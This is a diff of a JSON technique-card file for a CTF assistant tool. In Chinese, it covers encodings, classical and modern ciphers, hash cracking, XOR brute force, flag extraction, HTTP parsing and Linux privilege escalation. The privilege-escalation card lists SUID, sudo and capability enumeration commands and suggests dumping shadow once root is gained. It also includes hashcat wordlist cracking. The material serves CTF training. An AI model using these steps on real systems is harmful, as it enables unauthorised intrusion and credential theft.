@@ -197,7 +197,6 @@
     "files": 89,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 57,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 8,
      "JorianWoltjer__practical-ctf": 6,
      "sajjadium__ctf-writeups": 0,
@@ -255,7 +254,6 @@
     "files": 107,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 84,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 0,
      "JorianWoltjer__practical-ctf": 2,
      "sajjadium__ctf-writeups": 0,
@@ -314,7 +312,6 @@
     "files": 275,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 144,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 43,
      "JorianWoltjer__practical-ctf": 11,
      "sajjadium__ctf-writeups": 0,
@@ -371,7 +368,6 @@
     "files": 142,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 114,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 8,
      "JorianWoltjer__practical-ctf": 3,
      "sajjadium__ctf-writeups": 0,
@@ -428,7 +424,6 @@
     "files": 401,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 227,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 36,
      "JorianWoltjer__practical-ctf": 5,
      "sajjadium__ctf-writeups": 1,
@@ -487,7 +482,6 @@
     "files": 451,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 231,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 53,
      "JorianWoltjer__practical-ctf": 47,
      "sajjadium__ctf-writeups": 0,
@@ -544,7 +538,6 @@
     "files": 1498,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 581,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 120,
      "JorianWoltjer__practical-ctf": 100,
      "sajjadium__ctf-writeups": 8,
@@ -606,7 +599,6 @@
     "files": 126,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 86,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 20,
      "JorianWoltjer__practical-ctf": 1,
      "sajjadium__ctf-writeups": 0,
@@ -659,7 +651,6 @@
     "files": 142,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 98,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 8,
      "JorianWoltjer__practical-ctf": 17,
      "sajjadium__ctf-writeups": 0,
@@ -747,7 +738,6 @@
     "files": 163,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 121,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 20,
      "JorianWoltjer__practical-ctf": 8,
      "sajjadium__ctf-writeups": 0,
@@ -804,7 +794,6 @@
     "files": 282,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 211,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 26,
      "JorianWoltjer__practical-ctf": 10,
      "sajjadium__ctf-writeups": 0,
@@ -861,7 +850,6 @@
     "files": 129,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 109,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 0,
      "JorianWoltjer__practical-ctf": 2,
      "sajjadium__ctf-writeups": 0,
@@ -919,7 +907,6 @@
     "files": 338,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 157,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 26,
      "JorianWoltjer__practical-ctf": 4,
      "sajjadium__ctf-writeups": 1,
@@ -976,7 +963,6 @@
     "files": 698,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 356,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 61,
      "JorianWoltjer__practical-ctf": 26,
      "sajjadium__ctf-writeups": 0,
@@ -1012,15 +998,17 @@
    ],
    "mechanism": "base 家族靠字符集与填充判断（base16=hex、base32=[A-Z2-7]、base64=[A-Za-z0-9+/]、base85/92 字符集更宽）；嵌套编码要逐层解并每层看字符集变化。变体（自定义表、倒序表）要拿\"解法能解出可读文本\"当验证。",
    "steps": [
-    "先 ctfctl codec guess 让它猜家族，再手工确认",
-    "每解一层就重新看字符集（层数与家族都在变）",
-    "非标准表：拿已知明文（如 flag{ 前缀）反推字母表映射",
-    "别硬猜：写出\"解完必须能看出是文本/镜像头\"的判据"
+    "先 ctfctl codec guess 拿候选家族",
+    "按候选解一层，立刻看输出的字符集变化（层数与家族都会变）",
+    "Base32 补 = 到 8 的倍数；UUEncode 每行首字符是长度；ROT13 只动字母、ROT47 动全部可打印 ASCII",
+    "非标准表用已知明文（flag{）反推字母映射",
+    "判据：解完必须能看出是文本或文件头（PNG/zip/{…）"
    ],
    "cmds": [
-    "ctfctl codec guess",
-    "ctfctl codec b64d \"$(cat s.txt)\"",
-    "ctfctl codec hexd \"666c6167\""
+    "ctfctl codec guess \"$(cat s.txt)\"",
+    "ctfctl codec b64d|b32d|b58d|a85d \"$(cat s.txt)\"",
+    "ctfctl codec hexd 666c6167 · rot47 '...' · morsed '.... . .-..' · unicoded '\\u4F60\\u597D'",
+    "ctfctl codec htmld '&#102;&#108;' · binaryd '01100110' · brainfuck '+++++++[>++++++++<-]>.'"
    ],
    "tools": [
     "CyberChef",
@@ -1032,7 +1020,6 @@
     "files": 1886,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 664,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 133,
      "JorianWoltjer__practical-ctf": 114,
      "sajjadium__ctf-writeups": 16,
@@ -1122,7 +1109,6 @@
     "files": 667,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 340,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 60,
      "JorianWoltjer__practical-ctf": 12,
      "sajjadium__ctf-writeups": 31,
@@ -1184,7 +1170,6 @@
     "files": 638,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 364,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 48,
      "JorianWoltjer__practical-ctf": 13,
      "sajjadium__ctf-writeups": 0,
@@ -1243,7 +1228,6 @@
     "files": 262,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 124,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 24,
      "JorianWoltjer__practical-ctf": 5,
      "sajjadium__ctf-writeups": 0,
@@ -1300,7 +1284,6 @@
     "files": 133,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 61,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 16,
      "JorianWoltjer__practical-ctf": 3,
      "sajjadium__ctf-writeups": 0,
@@ -1359,7 +1342,6 @@
     "files": 440,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 239,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 50,
      "JorianWoltjer__practical-ctf": 21,
      "sajjadium__ctf-writeups": 21,
@@ -1416,7 +1398,6 @@
     "files": 77,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 38,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 8,
      "JorianWoltjer__practical-ctf": 1,
      "sajjadium__ctf-writeups": 0,
@@ -1472,7 +1453,6 @@
     "files": 88,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 55,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 12,
      "JorianWoltjer__practical-ctf": 3,
      "sajjadium__ctf-writeups": 0,
@@ -1528,7 +1508,6 @@
     "files": 206,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 116,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 23,
      "JorianWoltjer__practical-ctf": 15,
      "sajjadium__ctf-writeups": 0,
@@ -1585,7 +1564,6 @@
     "files": 33,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 29,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 4,
      "JorianWoltjer__practical-ctf": 0,
      "sajjadium__ctf-writeups": 0,
@@ -1643,7 +1621,6 @@
     "files": 236,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 214,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 0,
      "JorianWoltjer__practical-ctf": 0,
      "sajjadium__ctf-writeups": 0,
@@ -1700,7 +1677,6 @@
     "files": 240,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 164,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 22,
      "JorianWoltjer__practical-ctf": 3,
      "sajjadium__ctf-writeups": 0,
@@ -1754,7 +1730,6 @@
     "files": 21,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 9,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 6,
      "JorianWoltjer__practical-ctf": 1,
      "sajjadium__ctf-writeups": 0,
@@ -1811,7 +1786,6 @@
     "files": 517,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 174,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 30,
      "JorianWoltjer__practical-ctf": 31,
      "sajjadium__ctf-writeups": 0,
@@ -1869,7 +1843,6 @@
     "files": 43,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 28,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 0,
      "JorianWoltjer__practical-ctf": 1,
      "sajjadium__ctf-writeups": 0,
@@ -1927,7 +1900,6 @@
     "files": 65,
     "per_source": {
      "Dest1ny-Sec__Des-CTF-Knowledge": 53,
-     "r3kapig__writeup": 0,
      "balsn__ctf_writeup": 2,
      "JorianWoltjer__practical-ctf": 2,
      "sajjadium__ctf-writeups": 0,
@@ -1945,6 +1917,584 @@
     {
      "title": "OWASP: Broken Access Control",
      "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+    }
+   ]
+  },
+  {
+   "id": "classical-cipher-family",
+   "title": "古典密码家族：单表→多表→几何，先穷举再分析",
+   "phase": "crypto",
+   "tags": [
+    "crypto",
+    "classic"
+   ],
+   "signals": [
+    "密文几乎全是 A–Z（可能按 5 个一组）",
+    "每个字母都错位但整体像单词（单表替换）",
+    "成对数字只含 1–5，或 5 位一组只含 a/b",
+    "题名/描述直接出现 凯撒/维吉尼亚/培根/栅栏/普莱费尔"
+   ],
+   "mechanism": "三类：①单表替换（凯撒=固定移位 26 种、阿特巴什=字母镜像、仿射=(a·x+b) mod 26 且 a 与 26 互质）②多表替换（维吉尼亚/博福特按密钥循环移位；博福特 C=(K−P) 且加解密同操作）③几何排列（栅栏按轨道重排、培根=5 位二进制、波利比奥斯=5×5 坐标、普莱费尔=5×5 矩阵双字母、J→I）。**密钥空间都极小**：凯撒 26、仿射 312、栅栏试几个轨道数 —— 先穷举，成本远低于频率分析。",
+   "steps": [
+    "先跑凯撒 26 个位移，挑「像人话」的那一行",
+    "单表再试阿特巴什与仿射（a∈{1,3,5,7,9,11,15,17,19,21,23,25}，b∈0..25）",
+    "分组/坐标类先归一化（培根把任意二分映射成 a/b；波利比奥斯两位一组）",
+    "多表先猜密钥长度（重合指数/卡西斯基），再试常见密钥词",
+    "判据：解出来必须能读出单词/flag 样式，别凭感觉"
+   ],
+   "cmds": [
+    "ctfctl codec cipher caesar \"KHOOR\" --brute",
+    "ctfctl codec cipher atbash \"SVOOL\"",
+    "ctfctl codec cipher affine \"RCLLA\" --a 5 --b 8 --decrypt",
+    "ctfctl codec cipher railfence \"WECRLTEERDSOEEFEAOCAIVDEN\" --rails 3 --decrypt",
+    "ctfctl codec cipher vigenere \"LXFOPVEFRNHR\" --key LEMON --decrypt",
+    "ctfctl codec cipher playfair \"BMODZBXDNABEKUDMUIXMMOUVIF\" --key PLAYFAIR --decrypt"
+   ],
+   "tools": [
+    "CyberChef",
+    "CTFCrackTools",
+    "ciphey"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "crypto_classic",
+    "files": 177,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 87,
+     "balsn__ctf_writeup": 16,
+     "JorianWoltjer__practical-ctf": 1,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 29,
+     "p4-team__ctf": 31,
+     "ctf-wiki__ctf-wiki": 13
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "算法面参考：CTFCrackTools X 的 encoding 模块清单（GPL-3.0，只看功能面）",
+     "url": "https://github.com/0Chencc/CTFCrackTools"
+    }
+   ]
+  },
+  {
+   "id": "hash-identify",
+   "title": "哈希/KDF：先按长度与格式认算法",
+   "phase": "crypto",
+   "tags": [
+    "crypto",
+    "hash"
+   ],
+   "signals": [
+    "一串十六进制，长度正好 32/40/64/128",
+    "带 $pbkdf2-sha256$i=…$salt$hash 或 $2b$ 之类前缀",
+    "题目要求「找原像/两个不同输入哈希相等」",
+    "同时给了 secret/key"
+   ],
+   "mechanism": "摘要长度基本固定：MD5=32、SHA1=40、SHA256=64、SHA512=128（hex 字符数），据此先定算法；HMAC 与普通哈希同长但**必须给密钥**；PBKDF2/argon 这类 KDF 自带 salt 与迭代次数，参数常直接写在密文里。认对算法才能决定下一步是查库、爆破还是长度扩展。",
+   "steps": [
+    "数位数+看字符集定算法；带前缀的按格式提取 salt/迭代参数",
+    "先查库（离线彩虹表/在线反查）→ 再 wordlist 爆破（hashcat -m 选对模式）",
+    "有密钥参数判 HMAC；带 salt 的按 KDF 重算，别做裸爆破",
+    "长度扩展只对 Merkle–Damgård 族（MD5/SHA1/SHA256）有效，SHA3/Blake2 免疫（见 length-extension 卡）"
+   ],
+   "cmds": [
+    "ctfctl codec guess 900150983cd24fb0d6963f7d28e17f72",
+    "ctfctl codec hash sha256 hello",
+    "ctfctl codec hash hmac-sha256 \"msg\" --key SECRET",
+    "ctfctl codec hash pbkdf2 password --salt S --iters 10000",
+    "haiti 098f6bcd4621d373cade4e832627b4f6",
+    "hashcat -m 0 h.txt /usr/share/wordlists/rockyou.txt"
+   ],
+   "tools": [
+    "hashcat",
+    "john",
+    "haiti",
+    "hashid"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "hash_crack",
+    "files": 48,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 26,
+     "balsn__ctf_writeup": 2,
+     "JorianWoltjer__practical-ctf": 10,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 8,
+     "p4-team__ctf": 0,
+     "ctf-wiki__ctf-wiki": 2
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2023_江苏省数据安全竞赛_决赛.full.md",
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2024_KCTF_大赛_-_第九题《第一次接触》设计思路及解析.full.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "长度识别与模式选择参考：CTFCrackTools X 的 hash 模块（GPL-3.0）",
+     "url": "https://github.com/0Chencc/CTFCrackTools"
+    }
+   ]
+  },
+  {
+   "id": "block-vs-stream-cipher",
+   "title": "现代密码：先判分组还是流、块多大",
+   "phase": "crypto",
+   "tags": [
+    "crypto",
+    "aes"
+   ],
+   "signals": [
+    "密文是 hex/base64 且长度是 16 或 8 的整数倍",
+    "题面/源码里给了 key、iv，或写着「默认密钥」",
+    "改密文一位只影响对应块（分组）／整段雪崩（流）",
+    "相同明文块解出相同密文块（ECB 指纹）"
+   ],
+   "mechanism": "分组密码（AES 块 16B；DES/3DES/Blowfish 块 8B）常配 CBC+PKCS7 → 密文长度必为块大小整数倍；流密码（RC4）逐字节异或、无填充 → 长度≈明文。CTF 实现里**常把默认 key/iv 硬编码在代码中**，拿到密文第一反应应是试默认值/题给值，再考虑爆破。ECB 不打乱块 → 结构泄露最好利用。",
+   "steps": [
+    "用长度判分组/流与块大小，并找重复密文块（→ECB）",
+    "给了 key/iv 直接解；没给先翻源码里的默认常量",
+    "用已知明文头（如 flag{）验证密钥/模式是否正确",
+    "弱密钥再上 hashcat；RC4 注意密钥复用会泄露",
+    "解出来是字节，转文本前先确认编码"
+   ],
+   "cmds": [
+    "ctfctl codec cipher rc4 \"bbf316e8d940af0ad3\" --key Key --decrypt",
+    "openssl enc -d -aes-128-cbc -K <hexKey> -iv <hexIv> -in ct.bin",
+    "python3 -c \"from Crypto.Cipher import AES;print(AES.new(k,AES.MODE_CBC,iv).decrypt(c))\""
+   ],
+   "tools": [
+    "pycryptodome",
+    "CyberChef",
+    "hashcat",
+    "openssl"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "crypto_aes",
+    "files": 610,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 314,
+     "balsn__ctf_writeup": 60,
+     "JorianWoltjer__practical-ctf": 11,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 85,
+     "p4-team__ctf": 73,
+     "ctf-wiki__ctf-wiki": 67
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/SSRF漏洞.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "模式与块大小判定参考：CTFCrackTools X 的 crypto 模块（GPL-3.0）",
+     "url": "https://github.com/0Chencc/CTFCrackTools"
+    }
+   ]
+  },
+  {
+   "id": "xor-key-brute",
+   "title": "XOR 密钥爆破：按「可打印率」排序",
+   "phase": "crypto",
+   "tags": [
+    "crypto",
+    "xor"
+   ],
+   "signals": [
+    "密文是 hex，当文本看是乱码",
+    "题面出现 xor/异或/单字节/重复密钥",
+    "长度与明文接近、没有块结构",
+    "隐约能看到部分可读片段"
+   ],
+   "mechanism": "单字节 XOR 只有 256 种密钥，可全试；判据用**可打印字符比例**（或英文词频），比例最高者极可能是明文。多字节密钥先按长度切成多列，每列退化成单字节爆破（长度可用重合指数猜）。",
+   "steps": [
+    "密文 hex→bytes",
+    "256 个密钥全试，按可打印率排序取前几",
+    "比例高但不成词 → 换词频打分再排",
+    "多字节：先猜长度，再分列爆破，最后拼回",
+    "判据：出现 flag{／常见词才算命中"
+   ],
+   "cmds": [
+    "ctfctl codec cipher xor --brute",
+    "ctfctl codec cipher xor \"hello\" --key k",
+    "ctfctl codec cipher xor \"030e070704\" --key k --decrypt",
+    "xortool -c 20 cipher.bin"
+   ],
+   "tools": [
+    "xortool",
+    "CyberChef"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "xor_cipher",
+    "files": 764,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 413,
+     "balsn__ctf_writeup": 66,
+     "JorianWoltjer__practical-ctf": 11,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 90,
+     "p4-team__ctf": 109,
+     "ctf-wiki__ctf-wiki": 75
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "按可打印率排序的思路参考：CTFCrackTools X 的 encoding/xor（GPL-3.0）",
+     "url": "https://github.com/0Chencc/CTFCrackTools"
+    }
+   ]
+  },
+  {
+   "id": "flag-regex-harvest",
+   "title": "Flag 收割：完整候选 + 半截可疑 + 多源汇总",
+   "phase": "misc",
+   "tags": [
+    "misc",
+    "method"
+   ],
+   "signals": [
+    "手里有一堆文本（响应/源码/日志/附件内容）",
+    "flag 可能被截断、跨行、或先被编码",
+    "需要从多处收集候选再人工判断"
+   ],
+   "mechanism": "用完整正则抓 `前缀{内容}` 得「完整候选」；**同时**用不带右括号的宽松正则抓「半截 flag」（被截断/换行/编码过的）——完整正则漏掉的往往正是关键线索。多来源候选去重汇总后按来源标注，人工确认格式再提交。",
+   "steps": [
+    "完整正则抓完整候选（前缀可能不统一：flag/CTF/NSSCTF/…）",
+    "宽松正则抓可疑片段，滤掉 {} 空壳",
+    "对候选再解一次编码（base64/hex/url/gzip）",
+    "汇总去重并标注来源，人工确认后提交"
+   ],
+   "cmds": [
+    "ctfctl codec extract --flags",
+    "ctfctl file ./附件 --strings 30   # 文件里也会扫 flag 样式串",
+    "grep -aoE '[A-Za-z0-9_?]{1,24}\\{[^}\\n]{2,200}\\}' -r ./out",
+    "strings -n 6 a.bin | grep -aiE 'flag|ctf|key\\{'"
+   ],
+   "tools": [
+    "ctfctl",
+    "ripgrep",
+    "strings"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "osint",
+    "files": 36,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 17,
+     "balsn__ctf_writeup": 0,
+     "JorianWoltjer__practical-ctf": 2,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 7,
+     "p4-team__ctf": 8,
+     "ctf-wiki__ctf-wiki": 2
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/Apiculture_2_write-up-针对API的渗透测试.full.md",
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/DIVER_OSINT_CTF_2024_writeup.full.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "完整+半截双正则的思路参考：CTF-WEB-TOOLS（未声明许可，仅思路）",
+     "url": "https://github.com/ChenFu0604/CTF-WEB-TOOLS"
+    }
+   ]
+  },
+  {
+   "id": "http-message-parse",
+   "title": "原始 HTTP 报文：先切请求行/头/体",
+   "phase": "misc",
+   "tags": [
+    "misc",
+    "web"
+   ],
+   "signals": [
+    "给了一段文本，第一行像 GET /path HTTP/1.1",
+    "随后有 Host: / Content-Length: / Cookie: 等 K: V 行",
+    "空行之后是 body（JSON 或表单）"
+   ],
+   "mechanism": "报文结构固定：请求行 → 头部（每行 `名字: 值`）→ 空行 → body。按**第一个空行**切分就能稳定拿到头与体；这是「给定原始包」类题的第一步：拿到 Host、头部集合与 body 预览，再决定改哪个参数或头重放。",
+   "steps": [
+    "按第一个空行把头/体分开",
+    "用 ^[A-Z]+ \\S+ HTTP/\\d\\.\\d 校验请求行",
+    "逐行收头部名值，取 Host、头部数、body 长度",
+    "body 试 JSON/表单解析",
+    "在头部值与 body 里找 token/flag，再决定用 ctfctl replay 重放哪条"
+   ],
+   "cmds": [
+    "python3 -c \"import sys;h,b=(sys.stdin.read().split('\\n\\n',1)+[''])[:2];print(h[:400])\"",
+    "ctfctl req get \"$U/path\" -H 'Cookie: x=1' -v",
+    "ctfctl replay resend --last -H 'X-Forwarded-For: 127.0.0.1' --diff"
+   ],
+   "tools": [
+    "ctfctl",
+    "Burp Suite"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "pcap",
+    "files": 262,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 124,
+     "balsn__ctf_writeup": 24,
+     "JorianWoltjer__practical-ctf": 5,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 43,
+     "p4-team__ctf": 34,
+     "ctf-wiki__ctf-wiki": 32
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "HTTP_RE + http-parse 的思路参考：CTF-WEB-TOOLS（未声明许可，仅思路）",
+     "url": "https://github.com/ChenFu0604/CTF-WEB-TOOLS"
+    }
+   ]
+  },
+  {
+   "id": "artifact-multiencoding",
+   "title": "附件文本抽取：多编码回退 + 可打印串",
+   "phase": "rev",
+   "tags": [
+    "rev",
+    "misc"
+   ],
+   "signals": [
+    "附件是二进制/未知格式，要在里面找线索",
+    "是文本但显示乱码（编码不对）",
+    "只想先看看里面有什么字符串"
+   ],
+   "mechanism": "中文题附件（尤其中文 CTF）常用 GBK/GB2312/BIG5，按 UTF-8 解会满屏替换符，之后所有正则都失效。正确顺序：UTF-8 → GB18030(GBK) → BIG5 → latin-1，取第一个能干净解码的；不是文本就按「连续可打印段(≥6)」抽取（等价 strings）。这一步不执行、不联网、不改文件。",
+   "steps": [
+    "先定类型（magic 与扩展名是否一致）",
+    "文本类按多编码回退解码，报告实际编码",
+    "二进制跑 strings（长度 6+，UTF-16 用 -e l）",
+    "解码后的文本也要重扫 flag（高字节会把可打印串切断）",
+    "结果再喂 flag 正则/熵分析/建议引擎"
+   ],
+   "cmds": [
+    "ctfctl file ./chal --strings 40",
+    "file a.bin",
+    "iconv -f GBK -t UTF-8 a.txt",
+    "strings -e l -n 6 a.bin"
+   ],
+   "tools": [
+    "ctfctl",
+    "binwalk",
+    "strings"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "encoding",
+    "files": 1886,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 664,
+     "balsn__ctf_writeup": 133,
+     "JorianWoltjer__practical-ctf": 114,
+     "sajjadium__ctf-writeups": 16,
+     "Dvd848__CTFs": 458,
+     "p4-team__ctf": 354,
+     "ctf-wiki__ctf-wiki": 147
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.idx.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "多编码回退（UTF-8→GBK/BIG5）的思路参考：CTF-WEB-TOOLS inc/artifact.php（未声明许可，仅思路）",
+     "url": "https://github.com/ChenFu0604/CTF-WEB-TOOLS"
+    }
+   ]
+  },
+  {
+   "id": "byte-address-codec",
+   "title": "字节/地址编解码：hex↔bytes、pack/unpack",
+   "phase": "method",
+   "tags": [
+    "pwn",
+    "misc"
+   ],
+   "signals": [
+    "要在 hex 字符串与原始字节间互转",
+    "泄漏里拿到地址，要 pack 进 payload",
+    "shellcode/payload 以 hex 或 base64 给出"
+   ],
+   "mechanism": "二进制题里数据在「hex 文本 / base64 文本 / 原始字节」三种表示间来回转：泄漏的地址是整数，要按小端 pack 成字节塞进 payload；题目给的密文或 shellcode 是 hex/base64，要先还原成 bytes。转换不改语义，但方向（端序/层数）错了满盘皆错。",
+   "steps": [
+    "先判断当前是 hex、base64 还是 raw",
+    "hex↔bytes 互转；多层（hex 里套 base64）逐层还原",
+    "地址用 p64/u64 按小端打包解包",
+    "转换后校验长度与是否含非法字节",
+    "再接后续溢出/ROP 逻辑"
+   ],
+   "cmds": [
+    "ctfctl codec hexd \"666c6167\"",
+    "ctfctl codec hex flag",
+    "ctfctl codec b64d \"aGVsbG8=\"",
+    "python3 -c \"from pwn import *;print(p64(0xdeadbeef))\""
+   ],
+   "tools": [
+    "pwntools",
+    "CyberChef"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "pwn_env",
+    "files": 395,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 217,
+     "balsn__ctf_writeup": 26,
+     "JorianWoltjer__practical-ctf": 5,
+     "sajjadium__ctf-writeups": 7,
+     "Dvd848__CTFs": 21,
+     "p4-team__ctf": 7,
+     "ctf-wiki__ctf-wiki": 112
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md",
+     "Des-CTF-Knowledge-main/SSRF漏洞.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "编解码能力面参考：CTFCrackTools X（GPL-3.0）",
+     "url": "https://github.com/0Chencc/CTFCrackTools"
+    }
+   ]
+  },
+  {
+   "id": "linux-privesc-gtfobins",
+   "title": "Linux 提权：先把 GTFOBins 当字典查",
+   "phase": "method",
+   "tags": [
+    "priv_esc",
+    "linux"
+   ],
+   "signals": [
+    "拿到低权 shell，要提权",
+    "有 SUID 程序、sudo 权限或能读写的计划任务",
+    "题目提到「从 www-data 到 root」"
+   ],
+   "mechanism": "提权是「枚举 + 查表」：先看有哪些可利用的原语（SUID、sudo -l、cron、capability、可写服务配置），再拿程序名去 **GTFOBins** 查它有没有 file-read/shell/sudo 等功能（GTFOBins 用 YAML frontmatter 记录每个二进制在 functions 下的可用姿势）。",
+   "steps": [
+    "枚举：uname -a / id / sudo -l / find / -perm -4000 -type f 2>/dev/null / getcap -r / 2>/dev/null",
+    "把每个非常规 SUID/sudo 程序名丢进 GTFOBins 查 functions",
+    "有 cron/可写脚本就改内容等它执行；有内核版本低就找对应 CVE",
+    "拿到 root 后再读 /root/flag 或导出 shadow"
+   ],
+   "cmds": [
+    "sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null",
+    "# 查到程序名后去 GTFOBins 搜它（本地可 clone 仓库 grep）",
+    "git clone https://ghfast.top/https://github.com/GTFOBins/GTFOBins.github.io && grep -rl 'sudo' _gtfobins/ | head"
+   ],
+   "tools": [
+    "GTFOBins",
+    "linpeas",
+    "pspy"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "priv_esc",
+    "files": 350,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 204,
+     "balsn__ctf_writeup": 22,
+     "JorianWoltjer__practical-ctf": 29,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 29,
+     "p4-team__ctf": 14,
+     "ctf-wiki__ctf-wiki": 52
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md",
+     "Des-CTF-Knowledge-main/SQL.md"
+    ],
